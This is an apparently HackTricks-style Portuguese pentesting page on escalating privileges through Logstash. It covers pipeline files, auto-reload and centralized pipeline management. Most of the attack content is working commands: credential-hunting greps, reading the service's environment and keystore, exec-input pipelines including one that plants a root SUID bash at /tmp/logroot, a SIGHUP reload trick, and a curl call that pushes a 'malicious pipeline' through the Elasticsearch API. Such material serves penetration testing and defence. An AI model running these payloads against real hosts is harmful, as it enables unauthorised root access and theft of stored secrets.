# Escalação de Privilégios do Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

O Logstash é usado para **coletar, transformar e despachar logs** por meio de um sistema conhecido como **pipelines**. Esses pipelines são compostos pelos estágios de **input**, **filter** e **output**.<sup>[[4]](#references)</sup> Um aspecto interessante surge quando o Logstash opera em uma máquina comprometida.

### Configuração do Pipeline

Nas instalações de pacotes Debian e RPM, os pipelines são configurados por meio de **/etc/logstash/pipelines.yml**, que lista os locais das configurações dos pipelines; outras distribuições colocam `pipelines.yml` no diretório `path.settings` do Logstash.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este arquivo revela onde estão localizados os arquivos **.conf** que contêm as configurações de pipeline. Ao usar um **Elasticsearch output**, inspecione as configurações `user`/`password`, `cloud_auth` ou `api_key`; os privilégios efetivos da conta dependem do Elasticsearch. Um glob `path.config` carrega todos os arquivos correspondentes para esse pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Se o Logstash for iniciado com `-f <directory>` em vez de `pipelines.yml`, `-f` terá precedência e **todos os arquivos dentro desse diretório serão concatenados em ordem lexicográfica e analisados como uma única configuração**.<sup>[[6]](#references)[[7]](#references)</sup> Isso cria 2 implicações ofensivas:

- Um arquivo inserido, como `000-input.conf` ou `zzz-output.conf`, pode alterar a forma como o pipeline final é montado
- Um arquivo malformado pode fazer a configuração combinada falhar na validação; durante o reload, o Logstash mantém o pipeline anterior, portanto valide os payloads antes de depender do auto-reload.<sup>[[1]](#references)</sup>

### Enumeração rápida em um host comprometido

Em um host onde o Logstash está instalado, inspecione rapidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Verifique também se a API de monitoramento local está acessível. Por padrão, ela faz bind em **127.0.0.1:9600**, o que geralmente é suficiente após obter acesso ao host.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Esses endpoints expõem IDs e configurações de pipelines, métricas de runtime e contadores de sucesso/falha do recarregamento da configuração, ajudando a confirmar se uma alteração foi aceita.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Se uma credencial recuperada tiver como alvo o **Elasticsearch**, consulte [esta outra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Escalonamento de privilégios via pipelines graváveis

Para tentar realizar um escalonamento de privilégios, primeiro identifique o usuário sob o qual o serviço Logstash está realmente sendo executado; não presuma que seja root ou o usuário **logstash**. Certifique-se de atender a **um** destes critérios:

- Possuir **acesso de escrita** a um arquivo de pipeline **.conf** **ou**
- O arquivo **/etc/logstash/pipelines.yml** usar um wildcard, e você poder escrever na pasta de destino.<sup>[[6]](#references)[[7]](#references)</sup>

Além disso, **uma** destas condições deve ser atendida:

- Ter capacidade de reiniciar o serviço Logstash **ou**
- O arquivo **/etc/logstash/logstash.yml** ter **config.reload.automatic: true** definido.<sup>[[1]](#references)[[15]](#references)</sup>

Quando há um wildcard na configuração, criar um arquivo que corresponda a esse wildcard permite a execução de comandos.<sup>[[7]](#references)[[9]](#references)</sup> Por exemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aqui, **interval** determina a frequência de execução em segundos. No exemplo fornecido, o comando **whoami** é executado a cada 120 segundos, com sua saída direcionada para **/tmp/output.log**.<sup>[[9]](#references)</sup>

Com **config.reload.automatic: true** em **/etc/logstash/logstash.yml**, o Logstash detectará e aplicará automaticamente configurações de pipeline novas ou modificadas, sem precisar de uma reinicialização.<sup>[[1]](#references)[[15]](#references)</sup> Se não houver um wildcard, ainda será possível fazer modificações nas configurações existentes, mas recomenda-se cautela para evitar interrupções.

### Cargas Úteis de Pipeline Mais Confiáveis

O plugin de input `exec` ainda funciona nas versões atuais e requer um **interval** ou um **schedule**. Ele executa fazendo **fork** da JVM do Logstash; portanto, se houver pouca memória, seu payload poderá falhar com `ENOMEM` em vez de ser executado silenciosamente.<sup>[[9]](#references)</sup>

Quando o serviço tem privilégios suficientes para criar um arquivo SUID pertencente ao root, um payload prático de escalada de privilégios é aquele que deixa um artefato persistente:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Se você não tiver permissões para reiniciar, mas puder enviar sinais ao processo, o Logstash também oferece suporte a um reload acionado por **SIGHUP** em sistemas semelhantes ao Unix:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Esteja ciente de que nem todo plugin permite reload. Por exemplo, a entrada **stdin** impede o reload automático; portanto, não presuma que `config.reload.automatic` sempre aplicará suas alterações.<sup>[[1]](#references)</sup>

### Roubo de Secrets do Logstash

Antes de focar apenas na execução de código, colete os dados aos quais o Logstash já tem acesso:

- Credenciais podem aparecer em saídas `elasticsearch {}`, URLs/configurações do `http_poller`, inputs JDBC ou configurações relacionadas à cloud; esses plugins expõem campos de credenciais que vale a pena pesquisar.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Configurações seguras podem estar em **`/etc/logstash/logstash.keystore`** ou em outro diretório `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- A senha do keystore pode ser fornecida por meio de **`LOGSTASH_KEYSTORE_PASS`**, e as instalações RPM/DEB obtêm as variáveis de ambiente do serviço de **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- A expansão de variáveis de ambiente com `${VAR}` é resolvida na inicialização do Logstash; portanto, vale a pena inspecionar o ambiente do serviço.<sup>[[14]](#references)</sup>

Verificações úteis:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Também vale a pena verificar isso porque o **CVE-2023-46672** mostrou que, em circunstâncias específicas, o Logstash registrava informações sensíveis em seus logs, incluindo secrets armazenados em seu keystore e referenciados na configuração; revise logs antigos do Logstash e entradas do `journald` caso essas circunstâncias possam se aplicar.<sup>[[3]](#references)</sup>

### Abuso do gerenciamento centralizado de pipelines

Em alguns ambientes, o host **não** depende de arquivos `.conf` locais. Se **`xpack.management.enabled: true`** estiver configurado, o Logstash poderá obter pipelines gerenciados centralmente do Elasticsearch/Kibana e, após a ativação desse modo, as configurações locais de pipeline deixarão de ser a fonte de verdade.<sup>[[2]](#references)</sup>

Isso significa que existe um caminho de ataque diferente:

1. Recupere as credenciais do Elastic nas configurações locais do Logstash, no keystore ou nos logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Verifique se a conta possui o privilégio de cluster **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Crie ou substitua um pipeline gerenciado centralmente para que o host do Logstash execute seu payload no próximo intervalo de polling.<sup>[[2]](#references)[[16]](#references)</sup>

A API do Elasticsearch usada para esse recurso é:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Isso é especialmente útil quando os arquivos locais são somente leitura, mas o Logstash já está registrado para buscar pipelines remotamente.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Recarregando o arquivo de configuração](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configurando o gerenciamento centralizado de pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Atualização de segurança do Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Criando um pipeline do Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Layout de diretórios do Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Múltiplos pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Executando o Logstash pela linha de comando](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Monitorando o Logstash com APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Plugin de entrada Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Keystore de secrets para configurações seguras](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Plugin de saída do Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Plugin de entrada Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Plugin de entrada Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Usando variáveis de ambiente](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [API do Elasticsearch: Criar ou atualizar um pipeline do Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [API do Logstash: Obter configurações dos pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [API do Logstash: Obter estatísticas dos pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
